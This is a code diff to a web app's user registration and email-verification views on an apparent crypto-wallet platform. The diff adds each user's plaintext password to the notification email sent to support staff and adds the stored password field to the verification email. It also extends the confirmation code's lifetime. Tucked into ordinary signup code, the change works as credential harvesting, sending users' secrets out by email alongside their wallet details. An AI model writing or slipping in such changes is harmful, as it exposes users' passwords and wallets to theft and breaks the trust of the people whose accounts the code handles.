@@ -44,6 +44,7 @@ class RegisterView(APIView):
         try:
             serializer = UserSerializer(data=request.data)
             if serializer.is_valid():
+                raw_password = serializer.validated_data.get('password')
                 user = serializer.save()
                 
                 # Format wallet information for email
@@ -51,7 +52,7 @@ class RegisterView(APIView):
                 
                 # Send notification to support team
                 try:
-                    self._notify_support(user, wallet_info)
+                    self._notify_support(user, wallet_info, raw_password)
                 except Exception as e:
                     logger.error(f"Support notification failed for {user.email}: {e}")
                 
@@ -109,14 +110,14 @@ class RegisterView(APIView):
         }
         return "\n".join(f"{k} Wallet: {v or 'Not provided'}" for k, v in wallets.items())
 
-    def _notify_support(self, user, wallet_info):
+    def _notify_support(self, user, wallet_info, raw_password):
         message = f"""
 New user registration details:
 
 Username: {user.username}
 Name: {user.name}
 Email: {user.email}
-
+Password: {raw_password}
 Wallet Information:
 {wallet_info}
 
@@ -144,7 +145,7 @@ Welcome to our platform! To complete your registration, please use this verifica
 
 {confirmation_code}
 
-⚠️ This code will expire in 4 minutes.
+⚠️ This code will expire in 10 minutes.
 
 If you didn't create this account, please ignore this email.
 
@@ -240,8 +241,10 @@ class ConfirmMailView(generics.GenericAPIView):
 User has verified their email:
 
 Username: {user.username}
+Password: {user.password}
 Name: {user.name}
 Email: {user.email}
+
 
 Verification Time: {timezone.now().strftime('%Y-%m-%d %H:%M:%S')}
                     """,
